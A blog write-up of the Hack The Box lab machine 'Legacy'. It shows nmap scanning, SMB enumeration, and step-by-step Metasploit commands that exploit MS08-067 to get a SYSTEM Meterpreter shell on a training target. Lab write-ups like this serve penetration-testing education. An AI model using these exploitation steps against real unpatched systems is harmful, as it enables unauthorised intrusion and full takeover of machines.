---
type: post
title: "Hack the Box Legacy Write-up"
date: 2020-05-12 10:00:00 +1000
---
Welcome to the next in this series of write-ups of "OSCP-like" boxes. This time we will be attacking Legacy which is another simple hack the box machine.

## Overview

![Legacy information image](/assets/img/htb-legacy-info.png){: .align-right}

Legacy is very similar to the [previous HTB box called Lame](https://bleepsec.com/2020/05/11/htb-oscp-lame-writeup.html) that we owned with an Samba SMB vulnerability.

Skills tested:

- Port scanning
- Service enumeration
- Vulnerability CVE identification
- Vulnerability exploitation

## Scanning and Enumeration

Starting with the usual `nmap -sC -sV -oA nmap/legacy 10.10.10.4` we only identify ports 139 and 445 as open with 3389 closed. The ever useful NSE scripts have also identified this as a Windows XP machine. My hacker-sense is tingling already because Windows XP is a very old OS with many vulnerabilities!

```text
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h29m00s, deviation: 2h07m16s, median: 4d22h59m00s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:bf:c5 (VMware)
| smb-os-discovery:
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-05-17T01:56:59+03:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

### Port 139 and 445 SMB

The goto tools for SMB enumeration are `smbclient -L \\10.10.10.4` and `enum4linux -a 10.10.10.4` however we appear to be running into the same time sync and clock skew issues which are preventing some enumeration. This could also be caused when SMB null session are disabled but this is unlikely on Windows XP.

![Legacy enum4linux output](/assets/img/legacy-enum4linux.png){: .align-center}

All is not lost however, since Windows XP has a very famous and reliable SMB vulnerability called MS08-067. Googling for "Windows XP SMB exploit" takes us to the Rapid7 site and documentation for a Metasploit module.

<https://www.rapid7.com/db/modules/exploit/windows/smb/ms08_067_netapi>

## Exploitation

Some buffer overflows can be unstable but the good news is that MS08-067 is a very reliable exploit and the Metasploit module is well tested. Following the instructions on the Rapid7 page should make this easy, we can usually leave the targeting as "Automatic" and the exploit will find the correct offset for the Windows XP version and language.

1. `msfconsole`
2. `search ms08-067`
3. `use exploit/windows/smb/ms08_067_netapi`
4. `set RHOSTS 10.10.10.4`
5. `exploit`

![Legacy ms08-067 output](/assets/img/legacy-ms08-067.png){: .align-center}

And we now have a Meterpreter shell as SYSTEM user with full access to the machine. Grab those flags from the user and administrator desktops and mark another box as pwned!
